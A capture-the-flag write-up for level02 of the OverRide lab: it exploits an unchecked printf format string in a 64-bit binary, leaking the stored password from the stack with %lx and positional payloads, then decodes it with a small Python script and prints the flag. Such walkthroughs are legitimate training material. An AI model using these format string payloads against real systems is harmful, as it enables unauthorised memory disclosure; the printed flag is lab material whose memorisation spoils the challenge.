In this challenge, it's immediately apparent that we can attempt a format string attack,
as there's an insecure call to printf here:

```c
if (strncmp(flag, s2, 41)) {
    printf(s);
    puts(" does not have access!");
    exit(1);
  }
```

For more details on format string attacks,
see especially [level 3](https://github.com/Sleleu/Rainfall/tree/main/level3),
[level 4](https://github.com/Sleleu/Rainfall/tree/main/level4), and [level 5](https://github.com/Sleleu/Rainfall/tree/main/level5) 
of the previous [Rainfall](https://github.com/Sleleu/Rainfall) project.

It quickly becomes clear that it's a 64-bit executable considering the addresses look like this: `0x0000000000400a75`

Source: https://lettieri.iet.unipi.it/hacking/format-strings.pdf
>The simplest way to exploit a format string vulnerability is to leak information
>from the stack of the process under attack. On 32b systems, a sequence of
>%x specifiers will cause printf() to print successive lines from the stack.
>On 64b systems, **the first 5 %lx will print the contents of the rsi, rdx, rcx, r8,
>and r9**, and any additional %lx will start printing successive stack lines.
>By studying the binary, or simply by observing the output, the attacker
>may be able to determine which of these lines contains the stack canary.
>On 32b systems the canary can be read with %x, **but on 64b you need %lx,
>because %x will only read 4 bytes in both systems.**

Indeed, it's important to understand that with a 64-bit architecture, 
the printf pointer advances not by 4 bytes but by 8 bytes at a time. 
For example, if we try to print the stack with %x flags:

```bash
--[ Username: %x %x %x %x %x %x %x %x %x %x %x %x %x
--[ Password: AAAABBBBCCCCDDDD
*****************************************
ffffe500 0 41 2a2a2a2a 2a2a2a2a ffffe6f8 f7ff9a08 41414141 43434343 0 0 0 0 does not have access!
```

Only the 'AAAA' and 'CCCC' values were printed, since this flag only reads 4 bytes. 
Using %lx:

```bash
--[ Username: %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx
--[ Password: AAAABBBBCCCCDDDD
*****************************************
7fffffffe500 0 41 2a2a2a2a2a2a2a2a 2a2a2a2a2a2a2a2a 7fffffffe6f8 1f7ff9a08 4242424241414141 4444444443434343 0 0 0 does not have access!
```

We can see all our values correctly.

Since we control the 8th formatter, we might attempt a format string attack + GOT overwrite on the `exit()` function, 
but what for since the flag is already present in the stack!

```C
  stream = fopen("/home/users/level03/.pass", "r");
  if ( !stream ) {
    fwrite("ERROR: failed to open password file\n", 1uLL, 0x24uLL, stderr);
    exit(1);
  }
  v9 = fread(flag, 1, 41, stream);
```


Trying to go as far back as possible:
```bash
level02@OverRide:~$ (python -c 'print "%lx " * 40') | ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
7fffffffe500 0 20 2a2a2a2a2a2a2a2a 2a2a2a2a2a2a2a2a 7fffffffe6f8 1f7ff9a08 786c2520786c2520 786c2520786c2520 786c2520786c2520 786c2520786c2520 786c2520786c2520 786c2520786c2520 786c2520786c2520 20786c2520 0 0 0 0 100000000 0 756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 does not have access!
```

We see a series of values on the stack, notably these repeating values: `786c2520786c2520` which mean `%lx %lx`, 
until we get a series of values that can be read as a string: 
`756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873`

However, we can't go any further like this, and these values that strongly resemble the flag we're 
looking for are only 8*4 = 32 characters, yet we know the flag size, which must be 41 bytes. 
To reach this size, we can go back up the stack from the 22nd %lx, 
we have to specify since the code doesn't allow us to go that far:

```bash
level02@OverRide:~$ (python -c 'print "%22$lx %23$lx %24$lx %25$lx %26$lx"') | ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d does not have access!
```

If we try to directly convert these values to str to get the flag, we'll fail because it's in little endian. 
So, we can either do it manually with, for example:

- https://codebeautify.org/hex-string-converter
- https://blockchain-academy.hs-mittweida.de/litte-big-endian-converter/
  
Or by writing a simple script:

```python
#!/usr/bin/python3
import argparse

def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.usage = "./script.py [-h] '6de60408 ffe60408 ...'"
    parser.add_argument("hex_str", help="hex string to convert from little endian to big endian, and print to string value.")
    return (parser.parse_args())  

def big_to_little_endian(hex_str: str):
    flag = ""
    for val in hex_str.split():
        converted_value = bytes.fromhex(val)[::-1]
        flag += converted_value.decode("utf-8")
    return flag

if __name__ == "__main__":
    try:
        args = parse_arguments()
        flag = big_to_little_endian(args.hex_str)
        print(f"Flag: {flag}")
    except (ValueError, IndexError) as e:
        print(f"./script.py: {e}")
```

And here's the flag!
```bash
./script.py "756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d"
Flag: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```
